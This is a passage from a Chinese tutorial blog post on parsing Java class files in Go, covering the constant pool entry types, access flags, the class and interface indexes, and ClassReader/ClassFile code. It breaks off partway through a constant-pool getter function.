63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">值为6</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">bytes</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u8</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">按照高位在前储存的double值</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" rowspan="2" align="left" valign="middle"><p align="left">CONSTANT_Class_info</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">tag</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u1</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">值为7</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">index</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u2</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">指向全限定名常量项的索引</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" rowspan="2" align="left" valign="middle"><p align="left">CONSTANT_String_info</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">tag</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u1</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">值为8</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">index</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u2</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">指向字符串字面量的索引</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" rowspan="3" align="left" valign="middle"><p align="left">CONSTANT_Fieldref_info</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">tag</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u1</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">值为9</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">index</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u2</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">指向声明字段的类或接口描述符CONSTANT_Class_info的索引项</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">index</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u2</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">指向字段描述符CONSTANT_NameAndType_info的索引项</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" rowspan="3" align="left" valign="middle"><p align="left">CONSTANT_Methodref_info</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">tag</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u1</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">值为10</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">index</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u2</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">指向声明方法的类描述符CONSTANT_Class_info的索引项</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">index</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u2</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">指向名称及类型描述符CONSTANT_NameAndType_info的索引项</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" rowspan="3" align="left" valign="middle"><p align="left">CONSTANT_InterfaceMethodref_info</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">tag</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u1</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">值为11</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">index</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u2</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">指向声明方法的接口描述符CONSTANT_Class_info的索引项</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">index</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u2</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">指向名称及类型描述符CONSTANT_NameAndType_info的索引项</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" rowspan="3" align="left" valign="middle"><p align="left">CONSTANT_NameAndType_info</p><p align="left">&nbsp;</p><p align="left">&nbsp;</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">tag</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u1</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">值为12</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">index</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u2</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">指向该字段或方法名称常量项的索引</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">index</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u2</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">指向该字段或方法描述符常量项的索引</p><div>&nbsp;</div></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" rowspan="3" align="left" valign="middle">CONSTANT_MethodHandle_info</td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">tag</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u1　　</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">值为15</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">refrence_kind</td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">u1</td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">值必须在1-9之间，决定了方法句柄的类型，方法句柄的类型的值表示方法句柄字节码的行为</td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">refrence_index</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">u2</td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">值必须是对常量池的有效索引</td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" rowspan="2" align="left" valign="middle">CONSTANT_MethodType_info</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">tag</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">u1</td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">值为16</td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">descriptor_index</td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">u2</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">值必须对常量池的有效索引，常量池在该处的项必须是CONSTANT_Utf8_info表示方法的描述符</td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" rowspan="3" align="left" valign="middle">CONSTANT_Dynamic_info</td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">tab</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">u1</td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">值为17</td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">bootstrap_method_attr_index</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">u2</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">值必须对当前Class文件中引导方法表的bootstrap_methods[]数组的有效索引</td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">name_and_type_index</td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">u2</td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">值必须对当前常量池的有效索引，常量池中在该索引出的项必须是CONSTANT_NameAndType_info结构，表示方法名和方法描述符</td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" rowspan="3" align="left" valign="middle">CONSTANT_InvokeDynamic_info</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">tag　</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">u1</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">值为18</td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">bootstrap_method_attr_index</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">u2</td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">值必须对当前Class文件中引导方法表的bootstrap_methods[]数组的有效索引</td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">name_and_type_index</td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">u2</td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">值必须对当前常量池的有效索引，常量池中在该索引出的项必须是CONSTANT_NameAndType_info结构，表示方法名和方法描述符</td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" rowspan="2" align="left" valign="middle">CONSTANT_Module_info</td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">tag</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">u1</td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">值为19</td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">name_index</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">u2</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">值必须对常量池的有效索引，常量池在该处的项必须是CONSTANT_Utf8_info表示模块名</td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" rowspan="2" align="left" valign="middle">CONSTANT_Package_info</td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">tag</td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">u1</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">值为20</td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">name_index</td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">u2</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">值必须对常量池的有效索引，常量池在该处的项必须是CONSTANT_Utf8_info表示包名</td></tr></tbody</table><table><thead><tr><th align="left"></th><th align="left"></th></tr></thead><tbody><tr><td align="left">—-</td><td align="left"></td></tr><tr><td align="left">## 类访问标志</td><td align="left"></td></tr></tbody></table><p>在常量池后就是类访问标志(access_flags),用于识别class文件内是类还是接口，是公有还是私有。如果是类的话，是否被声明为final等。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvw71lxc8zj31fu0u0ncd.jpg" alt=""></p><h2 id="类和超类索引"><a href="#类和超类索引" class="headerlink" title="类和超类索引"></a>类和超类索引</h2><p>类访问标志之后是两个u2类型的常量池索引，分别给出类名和超类名.class文件存储的类名类似完全限定名，但是把点换成了斜线，Java语言规范把这种名字叫做二进制名。除了java.lang.Object之外，其他类都有超类，所以superclass只在Object.class中是0.</p><p>name_index和descriptor_index。 它们都是对常量池项的引用， 分别代表着字段的简单名称以及字段和方法的描述符。<br>　　全限定名:仅仅是把类全名中的“.”替换成了“/”而已，例如类名org.apache.xxxx，器全限定名为org/apache/xxxx。<br>　　简单名称:就是指没有类型和参数修饰的方法或者字段名称， 比如类中的inc()方法和m字段的简单名称分别就是“inc”和“m”。<br>　　方法和字段的描述符：描述符的作用是用来描述字段的数据类型、 方法的参数列表（包括数量、 类型以及顺序） 和返回值。 根据描述符规则， 基本数据类型（byte、 char、 double、 float、 int、 long、 short、 boolean） 以及代表无返回值的void类型都用一个大写字符来表示， 而对象类型则用字符L加对象的全限定名来表示。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw0hbqixsgj31g20u07i2.jpg" alt=""></p><h2 id="接口索引表"><a href="#接口索引表" class="headerlink" title="接口索引表"></a>接口索引表</h2><p>类和超类索引后面是接口索引表，表中存放的也是常量池索引，给出该类实现的所有接口的名字，示例代码没有实现接口。</p><h2 id="字段和方法表"><a href="#字段和方法表" class="headerlink" title="字段和方法表"></a>字段和方法表</h2><p>Class文件存储格式中对方法的描述与对字段的描述采用了几乎完全一致的方式， 方法表的结构如同字段表一样， 依次包括访问标志（access_flags） 、 名称索引（name_index） 、 描述符索引（descriptor_index） 、 属性表集合（attributes） 几项。</p><pre><code>field_info &#123;    u2        access_flags;    u2        name_index;    u2        descriptor_count;    u2        attributes_count;    attribute_info        attributes[attributes_count]; &#125;</code></pre><p>下面是本文中解析的Java代码</p><pre><code class="java">public class go&#123;    public static final boolean FLAG = true;    public static final byte BYTE = 123;    public static final char X = &#39;X&#39;;    public static final short SHORT = 12345;    public static final int INT = 123456789;    public static final long LONG = 12345678901L;    public static final float PI = 3.14f;    public static final double E = 2.71828;    public static void main(String[] args) throws RuntimeException&#123;        System.out.println(&quot;Hello World!&quot;);    &#125;&#125;</code></pre><h1 id="解析class文件"><a href="#解析class文件" class="headerlink" title="解析class文件"></a>解析class文件</h1><h2 id="结构体的创建"><a href="#结构体的创建" class="headerlink" title="结构体的创建"></a>结构体的创建</h2><p>因为直接去读去class文件的字节码不方便，而且会增加重复操作从而增加代码量，并且增大阅读难度，所以先定义一个结构体，来存储字节码。创建classfile/class_reader.go</p><pre><code class="go">type ClassReader struct&#123;    data []byte&#125;</code></pre><p>再定义几个方法去读取u1、u2、u4等字节的函数</p><h3 id="readUint8"><a href="#readUint8" class="headerlink" title="readUint8"></a>readUint8</h3><p>构造readUint8来读取u1类型的参数</p><pre><code class="go">func (self *ClassReader) readUint8() uint8 &#123;    val := self.data[0]    self.data = self.data[1:]    return val&#125;</code></pre><h3 id="readUint16"><a href="#readUint16" class="headerlink" title="readUint16"></a>readUint16</h3><p>构造readUint16来读取u2类型的参数,go语言的标准库encoding/binary，正好定义了一个变量BigEndian，正好可以从[]byte中解码多字节数据。</p><pre><code class="go">func (self *ClassReader) readUint16() uint16 &#123;    val := binary.BigEndian.Uint16(self.data)    self.data = self.data[2:]    return val&#125;</code></pre><h3 id="readUint32"><a href="#readUint32" class="headerlink" title="readUint32"></a>readUint32</h3><p>构造readUint函数来读取u4类型的参数</p><pre><code class="go">func (self *ClassReader) readUint32() uint32 &#123;    val := binary.BigEndian.Uint32(self.data)    self.data = self.data[4:]    return val&#125;</code></pre><h3 id="readUint64"><a href="#readUint64" class="headerlink" title="readUint64"></a>readUint64</h3><p>readUint64读取uint64类型数据，Java虚拟机规范中并没有定义u8.</p><pre><code class="go">func (self *ClassReader) readUint64() uint64 &#123;    val := binary.BigEndian.Uint64(self.data)    self.data = self.data[8:]    return val&#125;</code></pre><h3 id="readUint16s"><a href="#readUint16s" class="headerlink" title="readUint16s"></a>readUint16s</h3><p>定义readUint16s去读取uint16表，而表的大小是由开头的uint16的数据标明的。</p><pre><code class="go">func (self *ClassReader) readUint16s() []uint16 &#123;    n := self.readUint16()    s := make([]uint16, n)    for i := range s &#123;        s[i] = self.readUint16()    &#125;    return s&#125;</code></pre><h3 id="readBytes"><a href="#readBytes" class="headerlink" title="readBytes"></a>readBytes</h3><p>定义readBytes去读取一定数量的字节数据</p><pre><code class="go">func (self *ClassReader) readBytes(n uint32) []byte &#123;    bytes := self.data[:n]    self.data = self.data[n:]    return bytes&#125;</code></pre><h2 id="整体读取"><a href="#整体读取" class="headerlink" title="整体读取"></a>整体读取</h2><p>有了ClassReader就可以读取class文件了。下面这里再重新列一下class文件结构，虽然前面已经给出，但是这里再提一下方便阅读：</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw0s473fc9j30v10u041j.jpg" alt=""></p><p>在classfile目录下创建class_file.go,首先按照class文件的格式创建一个结构体，但是结构体中去掉了字段数、方法数、属性个数的属性，来减少内存的占用，在读取时直接去读取字节。</p><pre><code class="go">type ClassFile struct &#123;    //magic uint32    minorVersion uint16    majorVersion uint16    constantPool ConstPool    accessFlags uint16    thisClass uint16    superClass uint16    interfaces []uint16    fields []*MemberInfo    methods []*MemberInfo    attributes []AttributeInfo&#125;</code></pre><p>class_file.go还实现了一系列的函数</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwdfmrclp3j30sg0vwdjw.jpg" alt=""></p><p>Parse函数将读取到的[]byte解析成ClassFile结构体，然后使用read函数存储金 ClassFile结构体中，read函数调用的是ClassRead，最后如果出错使用recover从错误场景中恢复，打印报错信息。</p><pre><code class="go">func Parse(classData []byte)(cf *ClassFile, err error)&#123;    defer func() &#123;        if r := recover(); r != nil &#123;            var ok bool            err, ok = r.(error)            if !ok &#123;                err = fmt.Errorf(&quot;%v&quot;, r)            &#125;        &#125;    &#125;()    cr := &amp;ClassReader&#123;classData&#125;    cf = &amp;ClassFile&#123;&#125;    cf.read(cr)    return&#125;func (self *ClassFile)read(cr *ClassReader)  &#123;    self.readAndCheckMagic(cr)    self.readAndCheckVersion(cr)    self.constantPool = readConstantPool(cr)    self.accessFlags = cr.readUint16()    self.thisClass = cr.readUint16()    self.superClass = cr.readUint16()    self.interfaces = cr.readUint16s()    self.fields = readMembers(cr, self.constantPool)    self.methods = readMembers(cr, self.constantPool)    self.attributes = readAttributes(cr, self.constantPool)&#125;</code></pre><pre><code>因为篇幅原因，下面给几个举例函数，其他几个函数的格式大抵相同：</code></pre><pre><code class="go">func (self *ClassFile)readAndCheckMagic(cr *ClassReader)&#123;       magic := cr.readUint32()       if magic != 0XCAFEBABE &#123;           panic(&quot;not java file&quot;)       &#125;&#125;func (self *ClassFile) SuperClassName() string &#123;      if self.superClass &gt; 0 &#123;           return self.constantPool.getClassName(self.superClass)       &#125;     return &quot;&quot;  &#125;    func (self *ClassFile) InterfaceNames() []string &#123;       interfaceNames := make([]string, len(self.interfaces))      for i, cpIndex := range self.interfaces &#123;               interfaceNames[i] = self.constantPool.getClassName(cpIndex)       &#125;     return interfaceNames  &#125;func (self *ClassFile)MinorVersion() uint16&#123;       return self.minorVersion  &#125;func (self *ClassFile) InterfaceNames() []string &#123;      interfaceNames := make([]string, len(self.interfaces))       for i, cpIndex := range self.interfaces &#123;           interfaceNames[i] = self.constantPool.getClassName(cpIndex)       &#125;     return interfaceNames  &#125;</code></pre><p>其中MajorVersion、MajorVersion、ConstantPool、AccessFlags、ClassName、Fields六个函数是gettet函数，用来返回字段值。SuperClassName用来返回超类名，InterfaceNames返回接口名。</p><p>在前面的文章中已经讲过class文件是如何表示Java版本的，这里的readAndCheckVersion用来检查版本</p><pre><code class="go">func (self *ClassFile)readAndCheckVersion(cr *ClassReader)&#123;   self.minorVersion = cr.readUint16()   self.majorVersion = cr.readUint16()   switch self.majorVersion &#123;   case 45:        return   case 46, 47, 48, 49, 50, 51, 52:        if self.minorVersion == 0&#123;   return   &#125;   &#125;&#125;</code></pre><h2 id="常量池-1"><a href="#常量池-1" class="headerlink" title="常量池"></a>常量池</h2><p>在class文件中版本号后面就是常量池了，常量池占据了很大一部分的数据，包括数字、字符串、类和接口名。</p><h3 id="ConstantInfo接口"><a href="#ConstantInfo接口" class="headerlink" title="ConstantInfo接口"></a>ConstantInfo接口</h3><p>ConstantInfo用来存储常量池中各种类型的数据，每个继承的结构体都需要实现readInfo()的函数来存储数据。创建一个classfile/const_pool.go，首先定义一些常量，来表示对应tag值的变量类型。</p><pre><code>CONSTANT_Class = 7  CONSTANT_Fieldref = 9  CONSTANT_Methodref = 10  CONSTANT_InterfaceMethodref = 11  CONSTANT_String = 8  CONSTANT_Integer = 3  CONSTANT_Float = 4  CONSTANT_Long = 5  CONSTANT_Double = 6  CONSTANT_NameAndType = 12  CONSTANT_Utf8 = 1  CONSTANT_MethodHandle = 15  CONSTANT_MethodType = 16  CONSTANT_InvokeDynamic = 18</code></pre><p>完整的代码如下，先读取tag通过tag的值初始化常量，然后去常量池中读取数据。</p><pre><code class="go">type ConstantInfo interface &#123;   readInfo(reader *ClassReader)  &#125;  func readConstantInfo(reader *ClassReader, cp ConstantPool) ConstantInfo&#123;   tag := reader.readUint8()   c := newConstantInfo(tag, cp)   c.readInfo(reader)   return c  &#125;  // todo ugly code  func newConstantInfo(tag uint8, cp ConstantPool) ConstantInfo &#123;   switch tag &#123;   case CONSTANT_Integer:        return &amp;ConstantIntegerInfo&#123;&#125;   case CONSTANT_Float:        return &amp;ConstantFloatInfo&#123;&#125;   case CONSTANT_Long:        return &amp;ConstantLongInfo&#123;&#125;   case CONSTANT_Double:        return &amp;ConstantDoubleInfo&#123;&#125;   case CONSTANT_Utf8:        return &amp;ConstantUtf8Info&#123;&#125;   case CONSTANT_String:        return &amp;ConstantStringInfo&#123;cp: cp&#125;   case CONSTANT_Class:        return &amp;ConstantClassInfo&#123;cp: cp&#125;   case CONSTANT_Fieldref:        return &amp;ConstantFieldrefInfo&#123;ConstantMemberrefInfo&#123;cp: cp&#125;&#125;   case CONSTANT_Methodref:        return &amp;ConstantMethodrefInfo&#123;ConstantMemberrefInfo&#123;cp: cp&#125;&#125;   case CONSTANT_InterfaceMethodref:        return &amp;ConstantInterfaceMethodrefInfo&#123;ConstantMemberrefInfo&#123;cp: cp&#125;&#125;   case CONSTANT_NameAndType:        return &amp;ConstantNameAndTypeInfo&#123;&#125;   case CONSTANT_MethodType:        return &amp;ConstantMethodTypeInfo&#123;&#125;   case CONSTANT_MethodHandle:        return &amp;ConstantMethodHandleInfo&#123;&#125;   case CONSTANT_InvokeDynamic:        return &amp;ConstantInvokeDynamicInfo&#123;&#125;   default:        panic(&quot;java.lang.ClassFormatError: constant pool tag!&quot;)   &#125;&#125;</code></pre><h3 id="ConstantPool"><a href="#ConstantPool" class="headerlink" title="ConstantPool"></a>ConstantPool</h3><p>在上面讲到获取常量，这里我们使用ConstantPool来存储常量池中所有的常量，因此ConstantPool是一个ConstantInfo的数组。</p><p>接下来是一些获取常量信息的函数如下：</p><pre><code class="go">func (self ConstantPool) getConstantInfo(index uint16) ConstantInfo &#123;   if cpInfo := self[index]; cpInfo != nil &#123;   return cpInfo     &#125;   panic(fmt.Errorf(&quot;Invalid constant pool index: %v!&quot;, index))  &#125;  func (self ConstantPool) getUtf8(index uint16) string&#123;   utf8Info := self.getConstantInfo(index).(*ConstantUtf8Info)   return utf8Info.str  &#125;  func (self ConstantPool)getNameAndType(index uint16)(string, string)&#123;   ntInfo := self.getConstantInfo(index).(*ConstantNameAndTypeInfo)   name := self.getUtf8(ntInfo.nameIndex)   des := self.getUtf8(ntInfo.descriptorIndex)   return name, des  &#125;  func (self ConstantPool)getClassName(index uint16) string&#123;   classinfo := 